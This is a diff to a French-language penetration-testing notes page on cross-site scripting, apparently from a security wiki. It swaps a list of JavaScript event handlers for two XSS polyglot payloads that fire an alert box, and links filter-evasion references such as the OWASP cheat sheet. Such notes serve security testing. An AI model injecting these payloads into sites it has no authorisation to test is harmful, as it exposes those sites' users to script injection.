@@ -7,88 +7,21 @@ permalink: /XSS/
 
 ## Tips & tricks
 
-Les articles suivants présentent des moyens de contourner certains protections (WAF, blacklist, etc.)
+### Payloads
 
-- [XSS without event handlers](https://brutelogic.com.br/blog/xss-without-event-handlers/): pour les situations où les events du type onerror sont bloqués
-
-## Liste des events javascripts
+Les payloads suivants peuvent être utiles:
 
 ``` text
-onclick
-oncontextmenu
-ondblclick
-onmousedown
-onmouseenter
-onmouseleave
-onmousemove
-onmouseover
-onmouseout
-onmouseup
-onkeydown
-onkeypress
-onkeyup
-onabort
-onbeforeunload
-onerror
-onhashchange
-onload
-onpageshow
-onpagehide
-onresize
-onscroll
-onunload
-onblur
-onchange
-onfocus
-onfocusin
-onfocusout
-oninput
-oninvalid
-onreset
-onsearch
-onselect
-onsubmit
-ondrag
-ondragend
-ondragenter
-ondragleave
-ondragover
-ondragstart
-ondrop
-oncopy
-oncut
-onpaste
-onafterprint
-onbeforeprint
-onabort
-oncanplay
-oncanplaythrough
-ondurationchange
-onended
-onerror
-onloadeddata
-onloadedmetadata
-onloadstart
-onpause
-onplay
-onplaying
-onprogress
-onratechange
-onseeked
-onseeking
-onstalled
-onsuspend
-ontimeupdate
-onvolumechange
-onwaiting
-onerror
-onmessage
-onopen
-onwheel
-ononline
-onoffline
-onshow
-ontoggle
-onwheel
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//"; alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
 ```
 
+```text
+" onclick=alert(1)//<button ' onclick=alert(1)//>*/alert(1)//
+```
+
+## Références
+
+- [Master the art of Cross Site Scripting](https://brutelogic.com.br/blog/)
+- [XSS without event handlers](https://brutelogic.com.br/blog/xss-without-event-handlers/): pour les situations où les events du type onerror sont bloqués
+- [XSS Filter Evasion](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)
+- [PassiveXssScan](https://github.com/jkadijk/burp-plugins): un plugin pour identifier automatiquement les éléments "reflected" dans Burp.
